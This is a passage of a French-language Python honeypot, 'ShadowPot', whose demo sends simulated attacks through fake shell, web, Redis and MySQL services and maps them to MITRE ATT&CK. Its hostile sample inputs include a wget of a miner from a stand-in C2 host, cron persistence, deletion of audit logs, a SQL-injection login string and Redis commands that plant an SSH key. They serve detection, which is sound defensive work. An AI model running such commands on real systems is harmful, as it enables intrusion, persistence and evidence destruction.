        ("wget http://c2-malware.darknet.ru/miner.sh", "Téléchargement d'un botnet"),
        ("chmod +x miner.sh", "Attribution des droits d'exécution"),
        ("crontab -e", "Implantation de persistance cron"),
        ("rm -rf /var/log/audit.log", "Évasion de défense et destruction de preuves")
    ]

    sandbox = LinuxVirtualSandbox(attacker_ip)
    shell_helper = ShellHoneypot(logger=logger)

    for cmd, purpose in test_commands:
        time.sleep(0.2)
        matched = shell_helper.analyze_command(cmd)
        ts = datetime.now().strftime("%H:%M:%S")

        session_data["commands"].append({"time": ts, "command": cmd, "mitre": [m["id"] for m in matched]})
        print(f"  {Colors.GRAY}[{ts}]{Colors.RESET} {Colors.CYAN}{attacker_ip}{Colors.RESET} $ {Colors.BOLD}{cmd}{Colors.RESET}")

        for m in matched:
            session_data["mitre_alerts"].append(m)
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE if m["severity"] == "HIGH" else Colors.YELLOW
            print(f"    {sev_col}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} ({m['tactic']}) -> {m['desc']}")

        resp = sandbox.execute(cmd)
        if resp:
            first_line = resp.split("\n")[0]
            print(f"    {Colors.GRAY}↳ Réponse émulée : {first_line[:70]}...{Colors.RESET}")

    logger.log_event(session_data)
    print(f"{Colors.GRAY}[*] Session shell clôturée pour {attacker_ip}.{Colors.RESET}\n")

    # Scénario 2 : Sonde Web & Injection SQL
    print(f"{Colors.ORANGE}{Colors.BOLD}--- SCÉNARIO 2 : FUZZING WEB, DIRECTORY TRAVERSAL & INJECTION SQL ---{Colors.RESET}")
    web_ip = "45.154.255.89"
    geo2 = {"country": "Pays-Bas (Botnet Scanner)", "country_code": "NL", "city": "Amsterdam", "isp": "Bulletproof Host", "threat_level": "Malveillant"}
    web_attacks = [
        ("GET", "/.env", ""),
        ("GET", "/wp-login.php", ""),
        ("POST", "/login", "username=admin' OR '1'='1&password=password")
    ]

    for method, path, body in web_attacks:
        time.sleep(0.2)
        target_check = path if method == "GET" else body
        matched_web = [r for r in MITRE_RULES if re.search(r["pattern"], target_check, re.IGNORECASE)]

        print(f"{Colors.RED}{Colors.BOLD}[🌐 WEB EXPLOIT]{Colors.RESET} {method} depuis {Colors.CYAN}{web_ip}{Colors.RESET} -> {Colors.BOLD}{path}{Colors.RESET}")
        if body:
            print(f"  {Colors.YELLOW}[POST DATA]{Colors.RESET} {body}")
        for m in matched_web:
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE
            print(f"  {sev_col}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

        w_session = {
            "session_id": f"web-{int(time.time())}",
            "type": "web_attack",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": web_ip,
            "geo": geo2,
            "method": method,
            "path": path,
            "body": body,
            "mitre_alerts": matched_web
        }
        logger.log_event(w_session)

    # Scénario 3 : Attaque Redis NoSQL (Injection de clé SSH T1098)
    print(f"\n{Colors.ORANGE}{Colors.BOLD}--- SCÉNARIO 3 : PIÈGE REDIS NOSQL (INJECTION DE CLÉ SSH T1098) ---{Colors.RESET}")
    redis_ip = "194.26.29.112"
    geo3 = {"country": "Russie", "country_code": "RU", "city": "Moscou", "isp": "BadHost LLC", "threat_level": "C2 Scanner"}
    redis_cmds = [
        "CONFIG SET dir /root/.ssh",
        "CONFIG SET dbfilename authorized_keys",
        "SET crackit \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@darknet\\n\\n\"",
        "SAVE"
    ]

    print(f"{Colors.RED}{Colors.BOLD}[🚨 REDIS EXPLOITATION]{Colors.RESET} Connexion entrante depuis {Colors.CYAN}{redis_ip}:51204{Colors.RESET} ({geo3['country']})")
    redis_alerts = []
    for rcmd in redis_cmds:
        time.sleep(0.2)
        print(f"  {Colors.YELLOW}[REDIS RAW CMD]{Colors.RESET} {rcmd}")
        for r in MITRE_RULES:
            if re.search(r["pattern"], rcmd, re.IGNORECASE):
                redis_alerts.append(r)
                print(f"    {Colors.RED}{Colors.BOLD}[⚡ MITRE {r['id']} - {r['name']}]{Colors.RESET} {r['desc']}")

    r_session = {
        "session_id": f"redis-{int(time.time())}",
        "type": "redis_exploit",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_ip": redis_ip,
        "geo": geo3,
        "commands": [{"time": datetime.now().strftime("%H:%M:%S"), "command": c} for c in redis_cmds],
        "mitre_alerts": redis_alerts
    }
    logger.log_event(r_session)

    # Scénario 4 : Brute Force Base de données MySQL
    print(f"\n{Colors.ORANGE}{Colors.BOLD}--- SCÉNARIO 4 : PIÈGE DATABASE MYSQL (BRUTE FORCE T1110) ---{Colors.RESET}")
    mysql_ip = "198.51.100.44"
    geo4 = {"country": "États-Unis", "country_code": "US", "city": "Ashburn", "isp": "Cloud Provider", "threat_level": "Scanner"}
    print(f"{Colors.RED}{Colors.BOLD}[🚨 MYSQL PROBE]{Colors.RESET} Handshake reçu depuis {Colors.CYAN}{mysql_ip}:38291{Colors.RESET}")
    print(f"  {Colors.YELLOW}[AUTH ATTEMPT]{Colors.RESET} Tentative d'accès administrateur : user='root'")
    print(f"  {Colors.RED}{Colors.BOLD}[⚡ MITRE T1110 - Brute Force]{Colors.RESET} Tentative de force brute base de données MySQL")

    m_session = {
        "session_id": f"mysql-{int(time.time())}",
        "type": "mysql_auth_attempt",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_ip": mysql_ip,
        "geo": geo4,
        "auth": {"username": "root"},
        "mitre_alerts": [{
            "id": "T1110",
            "name": "Brute Force (Database)",
            "tactic": "Credential Access",
            "severity": "HIGH",
            "desc": "Tentative de force brute ou connexion non autorisée sur service de base de données MySQL"
        }]
    }
    logger.log_event(m_session)

    # Génération finale du rapport
    time.sleep(0.5)
    print(f"\n{Colors.GREEN}{Colors.BOLD}=== SIMULATION TERMINÉE — SYNTHÈSE DES RAPPORTS FORENSIQUES ==={Colors.RESET}")
    generate_incident_report(logger.log_dir)
    print(f"{Colors.LIGHT_GREEN}[✓] Démonstration ShadowPot v2.0 achevée avec succès !{Colors.RESET}\n")


# =============================================================================
# POINT D'ENTRÉE DU SCRIPT
# =============================================================================
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="ShadowPot v2.0 : Honeypot Multi-Services & Moteur de Profilage MITRE ATT&CK",
        epilog="Exemples :\n  python shadowpot.py --demo                      (Simulation offensive complète)\n  python shadowpot.py --shell-port 2222 --web-port 8080 (Écoute réelle)\n  python shadowpot.py --report                    (Générer le rapport HTML)",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--host", default="0.0.0.0", help="Adresse IP d'écoute de tous les leurres (Défaut: 0.0.0.0)")
    parser.add_argument("--shell-port", type=int, default=2222, help="Port du faux shell Linux interactif (Défaut: 2222)")
    parser.add_argument("--web-port", type=int, default=8080, help="Port du faux portail Web & SOC Dashboard (Défaut: 8080)")
    parser.add_argument("--redis-port", type=int, default=6379, help="Port du leurre Redis NoSQL (Défaut: 6379)")
    parser.add_argument("--mysql-port", type=int, default=3306, help="Port du leurre MySQL Database (Défaut: 3306)")
    parser.add_argument("--webhook", help="URL Webhook Discord/Slack pour notification d'intrusion temps réel")
    parser.add_argument("--demo", action="store_true", help="Lance la suite de simulation offensive (4 scénarios)")
    parser.add_argument("--report", action="store_true", help="Génère uniquement le rapport forensique HTML")

    args = parser.parse_args()

    logger = ThreatLogger(webhook_url=args.webhook)

    if args.report:
        generate_incident_report(logger.log_dir)
        return

    if args.demo:
        run_simulation(logger)
        return

    # Lancement des 4 serveurs leurres en arrière-plan
    threads = [
        ShellHoneypot(host=args.host, port=args.shell_port, logger=logger),
        WebHoneypot(host=args.host, port=args.web_port, logger=logger),
        RedisHoneypot(host=args.host, port=args.redis_port, logger=logger),
        MySQLHoneypot(host=args.host, port=args.mysql_port, logger=logger)
    ]

    for t in threads:
        t.daemon = True
        t.start()

    time.sleep(0.5)
    print(f"\n{Colors.CYAN}{Colors.BOLD}[*] LA GRILLE DE DÉCEPTION EST ARMÉE SUR TOUS LES PORTS : {Colors.RESET}")
    print(f"  {Colors.LIGHT_GREEN}• Shell Linux (SSH/Telnet) :{Colors.RESET} {args.host}:{args.shell_port}")
    print(f"  {Colors.LIGHT_GREEN}• Portail Web Admin & Traps:{Colors.RESET} http://{args.host}:{args.web_port}")
    print(f"  {Colors.LIGHT_GREEN}• Console SOC Dashboard    :{Colors.RESET} http://{args.host}:{args.web_port}/_soc")
    print(f"  {Colors.LIGHT_GREEN}• Leurre Redis NoSQL       :{Colors.RESET} {args.host}:{args.redis_port}")
    print(f"  {Colors.LIGHT_GREEN}• Leurre MySQL Database    :{Colors.RESET} {args.host}:{args.mysql_port}")
    print(f"\n{Colors.GRAY}Appuyez sur Ctrl+C pour arrêter ShadowPot et compiler le rapport forensique.{Colors.RESET}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Arrêt de la grille ShadowPot...{Colors.RESET}")
        generate_incident_report(logger.log_dir)
        print(f"{Colors.GREEN}[✓] Rapport forensique et flux SIEM mis à jour. Au revoir.{Colors.RESET}")


if __name__ == "__main__":
    main()
